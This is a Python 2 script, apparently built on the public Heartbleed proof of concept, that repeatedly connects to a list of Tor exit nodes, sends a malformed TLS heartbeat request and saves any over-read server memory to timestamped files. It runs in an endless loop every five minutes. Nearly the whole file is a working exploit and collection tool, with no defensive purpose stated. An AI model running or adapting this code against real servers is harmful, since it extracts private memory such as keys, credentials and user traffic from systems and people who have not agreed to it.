#!/usr/bin/python
#
# Run using:
#  python ssl_tor.py <path>

import sys
import struct
import socket
import time
from time import gmtime, strftime
import select
import re

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')

hb = h2bin(''' 
18 03 02 00 03
01 40 00
''')

def append_to_file(filename, data):
  with open(filename, "a") as f:
    f.write(data + "\n")

def hexdump(s):
    pass
    '''
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print
    '''
def log(s):
  print "[{0}] {1}".format(strftime("%Y-%m-%d %H:%M:%S", gmtime()), s)
  sys.stdout.flush()

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            try:
              data = s.recv(remain)
            except:
              return None

            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        log("|--Unexpected EOF receiving record header - server closed connection")
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        log('|--Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    #print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
    return typ, ver, pay

def hit_hb(s, exit_node):
    s.send(hb)
    typ, ver, pay = recvmsg(s)
    if typ is None:
        log('|--%s not vulnerable' % exit_node)
        return False
    elif typ == 24:
        hexdump(pay)
        if len(pay) > 3:
            log("|--Vulnerable exit node found at %s" % exit_node)
            append_to_file( "{0}_{1}".format(exit_node, strftime("%Y%m%d_%H-%M", gmtime())), pay )
            return True
        else:
            log('|--%s not vulnerable' % exit_node)
            return False
    elif typ == 21:
        hexdump(pay)
        log('|--%s not vulnerable' % exit_node)
        return False

def read_tor_nodes(path):
  f = open(path, 'r')
  node_list = []
  for node in f.readlines():
    node_list.append(node.strip())
  return node_list

def revisit_node(exit_node):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.settimeout(1)

  log('Connecting to %s' % exit_node)
  sys.stdout.flush()

  try:
    s.connect((exit_node.strip(), 443))
  except:
    log("|--Timeout or refused connection")
    return False

  log("|--Connection established")
  s.send(hello)
  sys.stdout.flush()

  reset_flag = False
  while True:
      typ, ver, pay = recvmsg(s)
      if typ == None:
          reset_flag = True
          break
      # Look for server hello done message.
      if typ == 22 and ord(pay[0]) == 0x0E:
          break
  if reset_flag == True:
    return False

  sys.stdout.flush()
  s.send(hb)
  return hit_hb(s, exit_node)

def revisit_exit_nodes(addresses):
  for exit_node in addresses:
    for i in range(5):
      success = revisit_node(exit_node)

      # If the previous request resulted in a failed
      # heartbeat, no reason to revisit it more times
      if not success:
        break

def main():
    args = sys.argv[1:]
    if len(args) < 1:
        print "Invalid arguments. Provide the path to the Tor exit node list"
        return

    addresses = read_tor_nodes(args[0])
    print "Found %d exit nodes in %s" % (len(addresses), args[0])

    # Every 5 minutes, we'll be visiting the each Tor exit node again
    # asking for a heartbeat response five times.
    while True:
      revisit_exit_nodes(addresses)
      time.sleep(5 * 60)
      log("<=== Time interval elapsed. Checking in with exit nodes ===>")

#####################################################################################

if __name__ == '__main__':
    main()
